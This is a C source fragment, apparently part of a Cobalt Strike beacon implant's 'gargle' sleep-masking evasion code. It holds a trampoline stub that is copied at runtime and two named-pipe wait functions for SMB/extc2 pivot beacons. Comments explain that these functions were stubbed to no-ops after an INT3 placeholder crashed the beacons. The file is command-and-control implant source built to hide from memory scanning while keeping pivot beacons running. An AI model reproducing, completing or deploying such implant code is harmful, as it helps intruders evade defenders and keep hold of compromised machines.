/* gargle! */
#include <WinSock2.h>
#include <windows.h>
#include <intrin.h>
#include "beacon.h"
#include "gargleint.h"

#define GARGLE_ACTION_PIPE_WAIT   0
#define GARGLE_ACTION_PIPE_PEEK   1

typedef struct {
	int    action;
	HANDLE pipe;
	BOOL (__stdcall *ConnectNamedPipe)(HANDLE, LPOVERLAPPED);
	DWORD(__stdcall *GetLastError)(void);
	BOOL(__stdcall *PeekNamedPipe)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
	void(__stdcall *Sleep)(DWORD);
} GARGLE_PIPE_ARGS;

typedef void(*GARGLEF)(GARGLEP * parms, GARGLE_PIPE_ARGS * args);

/* this is the stub function we copy over */
/* For CS 4.4 the pattern size is 268 */
/* For CS 4.5 the pattern size is 768 */
static void _gargle_it(GARGLEP * parms, GARGLE_PIPE_ARGS * args) {
	GARGLE_TRAMPOLINE_STUB()
}

static void setup_trampoline2() {
	gargle_trampoline(setup_trampoline2, _gargle_it);
}

void GargleBlockPipe(HANDLE pipe) {
	/* The 4.5 wait-mask trampoline body is an INT3 placeholder in this
	 * codebase (see gargle.cpp): with a mask-enabled profile (nook != 0)
	 * every extc2/pivot pipe beacon used to execute it and die here
	 * (2026-10-04 extc2 regression, RVA-proven against the map). Until a
	 * gen3 wait-window variant lands, degrade to the proven no-mask
	 * posture - a no-op here - never a crash. */
	(void)pipe;
}

BOOL GarglePipeWait(HANDLE pipe) {
	/* Same trap as GargleBlockPipe: the trampoline target is the INT3
	 * template. FALSE makes smb_wait() take its plan-B ConnectNamedPipe
	 * loop - identical to the long-proven nook == 0 behavior. */
	(void)pipe;
	return FALSE;
}